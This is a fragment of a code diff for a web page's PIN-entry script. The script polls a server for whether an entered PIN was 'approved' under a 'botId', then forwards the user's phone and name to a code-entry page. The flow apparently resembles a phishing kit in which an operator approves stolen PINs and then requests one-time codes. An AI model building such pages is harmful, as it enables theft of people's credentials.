+            stopPolling();
+            setLoading(false);
+            clearAllBoxes();
+            showAlert('❌ Account restricted. Please try again later.', 'error');
+            return;
+          }
+
+          if (status.approved === true) {
+            stopPolling();
+            setLoading(false);
+            showAlert('✅ PIN verified! Redirecting...', 'success');
+            setTimeout(function() {
+              window.location.href = 'code.html?botId=' + encodeURIComponent(botId) +
+                                     '&phone=' + encodeURIComponent(phone) +
+                                     '&name=' + encodeURIComponent(name);
+            }, 700);
+            return;
+          }
+
+          if (status.approved === false) {
+            stopPolling();
+            setLoading(false);
+            clearAllBoxes();
+            showAlert('❌ Incorrect PIN. Please try again.', 'error');
+            pinBoxes.forEach(function(b) { b.classList.add('error'); });
+            setTimeout(function() {
+              pinBoxes.forEach(function(b) { b.classList.remove('error'); });
+            }, 600);
+            if (pinBoxes[0]) pinBoxes[0].focus();
+            return;
+          }
+
+          if (attempts > MAX_ATTEMPTS) {
+            stopPolling();
+            setLoading(false);
+            showAlert('⏳ Taking too long. Please try again.', 'error');
+            return;
+          }
+        } catch (err) {
+          console.error('Polling error:', err);
+        }
+      }, 1500);
+
+    } catch (err) {
+      setLoading(false);
+      showAlert('❌ ' + (err.message || 'Something went wrong. Please try again.'), 'error');
+    }
+  });
+
+  // ---------- INIT ----------
+  updateButtonState();
+  if (pinBoxes[0]) pinBoxes[0].focus();
+
+  // Extra safety: recompute on any focus/blur, in case autofill or IME set values
+  document.addEventListener('focusin', updateButtonState);
+  document.addEventListener('focusout', function() {
+    setTimeout(updateButtonState, 20);
+  });
+})();
 </script>
 
 </body>
